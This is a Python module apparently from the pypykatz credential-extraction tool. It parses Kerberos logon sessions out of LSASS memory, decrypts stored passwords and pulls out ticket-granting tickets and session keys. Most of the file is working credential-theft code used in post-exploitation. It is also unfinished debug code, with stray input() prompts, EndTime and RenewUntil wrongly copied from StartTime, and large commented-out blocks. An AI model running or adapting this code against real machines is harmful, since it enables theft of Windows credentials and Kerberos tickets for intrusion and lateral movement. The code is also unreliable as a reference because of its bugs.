#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import logging

from pypykatz.commons.common import *
from pypykatz.commons.filetime import *
from .templates import *
from pypykatz.lsadecryptor.package_commons import *

class KerberosTicket:
	def __init__(self):
		self.ServiceName = None
		self.DomainName = None
		self.ETargetName = None
		self.TargetDomainName = None
		self.EClientName = None
		self.AltTargetDomainName = None
		self.Description = None

		self.StartTime = None
		self.EndTime = None
		self.RenewUntil = None

		self.KeyType = None
		self.Key = None

		self.TicketFlags = None
		self.TicketEncType = None
		self.TicketKvno = None
		self.Ticket = None
		
	def parse(kerberos_ticket, reader):
		kt = KerberosTicket()
		kt.ServiceName = kerberos_ticket.ServiceName.read(reader).read(reader)
		print(kt.ServiceName)
		kt.DomainName = kerberos_ticket.DomainName.read_string(reader)
		kt.ETargetName = kerberos_ticket.TargetName.read(reader).read(reader) #### ENCRYPTED????
		input(kt.ETargetName)
		kt.TargetDomainName = kerberos_ticket.TargetDomainName.read_string(reader) 
		#input('%x'%kerberos_ticket.ClientName.value)
		kt.EClientName = kerberos_ticket.ClientName.read(reader).read(reader) #### ENCRYPTED????
		kt.AltTargetDomainName = kerberos_ticket.AltTargetDomainName.read_string(reader)
		kt.Description = kerberos_ticket.Description.read_string(reader)
        
		kt.StartTime = filetime_to_dt(kerberos_ticket.StartTime)
		kt.EndTime = filetime_to_dt(kerberos_ticket.StartTime)
		kt.RenewUntil = filetime_to_dt(kerberos_ticket.StartTime)
        
		kt.KeyType = kerberos_ticket.KeyType
		kt.Key = kerberos_ticket.Key.read(reader)
        
		kt.TicketFlags = kerberos_ticket.TicketFlags
		kt.TicketEncType = kerberos_ticket.TicketEncType
		kt.TicketKvno = kerberos_ticket.TicketKvno
		kt.Ticket = kerberos_ticket.Ticket.read(reader)
		
		input(hexdump(kt.Ticket))
		
		return kt
	
	def __str__(self):
		t =  '== Kerberos Ticket ==\n'
		t += 'ServiceName: %s\n'% self.ServiceName
		t += 'DomainName: %s\n'% self.DomainName
		t += 'ETargetName: %s\n'% self.ETargetName
		t += 'TargetDomainName: %s\n'% self.TargetDomainName
		t += 'EClientName: %s\n'% self.EClientName
		t += 'AltTargetDomainName: %s\n'% self.AltTargetDomainName
		t += 'Description: %s\n'% self.Description
		t += 'StartTime: %s\n'% self.StartTime.isoformat()
		t += 'EndTime: %s\n'% self.EndTime.isoformat()
		t += 'RenewUntil: %s\n'% self.RenewUntil.isoformat()
		t += 'KeyType: %s\n'% self.KeyType
		t += 'Key: %s\n'% self.Key
		t += 'TicketFlags: %s\n'% self.TicketFlags
		t += 'TicketEncType: %s\n'% self.TicketEncType
		t += 'TicketKvno: %s\n'% self.TicketKvno
		t += 'Ticket: %s\n'% self.Ticket.hex()		
		return t
		
class KerberosDecryptor(PackageDecryptor):
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		super().__init__('Kerberos')
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.credentials = []
		
	def find_signature(self):
		logging.log(1, '[KerberosDecryptor] Searching for key struct signature')
		fl = self.reader.find_in_module('kerberos.dll',self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('[KerberosDecryptor] Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
		
	def add_entry(self, wdigest_entry):
		input('Press for next list')
	
	def handle_ticket(self, kerberos_ticket):
		try:
			kt = KerberosTicket.parse(kerberos_ticket, self.reader)
			print(str(kt))
			input('press button recieve bacon')
			#self.log_ptr(kerberos_ticket.ServiceName.value, 'Kerberos ticket servicename')
			#servicename = kerberos_ticket.ServiceName.read(self.reader)
			#servicename.read(self.reader)
			#print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!TargetDomainname: %s' % kerberos_ticket.TargetDomainName.read_string(self.reader))
		except Exception as e:
			raise e
		input('ticket')
		
	def handle_session_key(self, session):
		input('key')
		
	
	def start(self):
		try:
			entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		except Exception as e:
			logging.log(1,'Failed to find Wdigest structs! Reason: %s' % e)
			return
			
		if self.reader.reader.sysinfo.MajorVersion < 6:
			raise Exception("Not yet implemented")
		else:
			result_ptr_list = []
			self.reader.move(entry_ptr_value)
			start_node = PRTL_AVL_TABLE(self.reader).read(self.reader)
			self.walk_avl(start_node.BalancedRoot.RightChild, result_ptr_list)
			print(result_ptr_list)
			for ptr in result_ptr_list:
				self.log_ptr(ptr, self.decryptor_template.kerberos_session_struct.__name__, datasize= 0x200)
				self.reader.move(ptr)
				kerberos_logon_session = self.decryptor_template.kerberos_session_struct(self.reader)
				print('LUID: %x' % kerberos_logon_session.LocallyUniqueIdentifier)
				
				### session secrets
				#print(kerberos_logon_session.credentials.UserName.read_string(self.reader))
				#print(kerberos_logon_session.credentials.Domaine.read_string(self.reader))
				#print(kerberos_logon_session.credentials.Password.read_data(self.reader).hex())
				# this could be machine password as well! (meaning: a huge blob of bytes!)
				password_crear = self.lsa_decryptor.decrypt(kerberos_logon_session.credentials.Password.read_data(self.reader))
				#print(hexdump(password_crear))
				
				#### key list (still in session) this is not a linked list (thank god!)
				if kerberos_logon_session.pKeyList.value != 0:
					key_list = kerberos_logon_session.pKeyList.read(self.reader, override_finaltype = self.decryptor_template.keys_list_struct)
					#print(key_list.cbItem)
					key_list.read(self.reader, self.decryptor_template.hash_password_struct)
					for key in key_list.KeyEntries:
						print(key.generic.Checksump.value)
						
						#self.log_ptr(key.generic.Checksump.value, 'Checksump', datasize = key.generic.Size)
						#if self.reader.reader.sysinfo.BuildNumber < WindowsBuild.WIN_10_1507.value and key.generic.Size > LSAISO_DATA_BLOB.size:
						#	if key.generic.Size <= LSAISO_DATA_BLOB.size + (len("KerberosKey") - 1) + 32: #AES_256_KEY_LENGTH
						#		input('1')
						#		data_blob = key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		data_blob.read(self.reader, key.generic.Size - LSAISO_DATA_BLOB.size)
						#		
						#		input('data blob end')
						#		"""
						#		kprintf(L"\n\t   * LSA Isolated Data: %.*S", blob->typeSize, blob->data);
						#		kprintf(L"\n\t     Unk-Key  : "); kull_m_string_wprintf_hex(blob->unkKeyData, sizeof(blob->unkKeyData), 0);
						#		kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
						#		kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
						#		kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
						#		kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); kprintf(L", 5:0x%x", blob->unk5);
						#		"""
						#	else:
						#		input('2')
						#		key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#		
						#else:
						#	
						#	if self.reader.reader.sysinfo.BuildNumber < WindowsBuild.WIN_VISTA.value:
						#		input('3')
						#		key.generic.Checksump.read(self.reader, override_finaltype = LSAISO_DATA_BLOB)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#		
						#	else:
						#		input('4')
						#		#we need to decrypt as well!
						#		self.reader.move(key.generic.Checksump.value)
						#		enc_data = self.reader.read(key.generic.Size)
						#		print(hexdump(enc_data))
						#		dec_data = self.lsa_decryptor.decrypt(enc_data)
						#		print(hexdump(dec_data))
						#		t_reader = GenericReader(dec_data)
						#		data_struct = LSAISO_DATA_BLOB(t_reader)
						#		print('unkData1 : %s' % data_struct.unkData1.hex())
						#		print('unkData2 : %s' % data_struct.unkData2.hex())
						#		print('Encrypted : %s' % data_struct.data.hex()) #another extra struct should wrap this data! ENC_LSAISO_DATA_BLOB
						#
						#input()
				
				
				# getting ticket granting service tickets
				if kerberos_logon_session.Tickets_1.Flink.value != 0 and kerberos_logon_session.Tickets_1.Flink.value != kerberos_logon_session.Tickets_1.Flink.location:
					input('getting ticket granting service tickets')
					self.walk_list(kerberos_logon_session.Tickets_1.Flink, self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				
				#if kerberos_logon_session.Tickets_2.Flink.value != 0:
				#	self.walk_list(kerberos_logon_session.Tickets_2.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				
				#if kerberos_logon_session.Tickets_3.Flink.value != 0:
				#	self.walk_list(kerberos_logon_session.Tickets_3.Flink,self.handle_ticket , override_ptr = self.decryptor_template.kerberos_ticket_struct)
				input('push button')
			"""
			self.reader.move(entry_ptr_loc)
			
			#test
			a = self.reader.get_ptr(entry_ptr_loc)
			self.log_ptr(a, 'TEST', datasize= 0x200)
			input('a')
			
			entry_ptr = self.decryptor_template.logon_session_struct(self.reader)
			kerberos_entry = entry_ptr.read(self.reader)
			self.log_ptr(entry_ptr.value, 'List entry -%s-' % self.decryptor_template.logon_session_struct.__name__, datasize= 0x200)
		
		
		
			self.walk_list(kerberos_entry.Tickets_1.Flink, kerberos_entry.Tickets_1.Flink.location, self.add_entry, override_ptr = self.decryptor_template.internal_ticket_struct)
			
			"""
			
	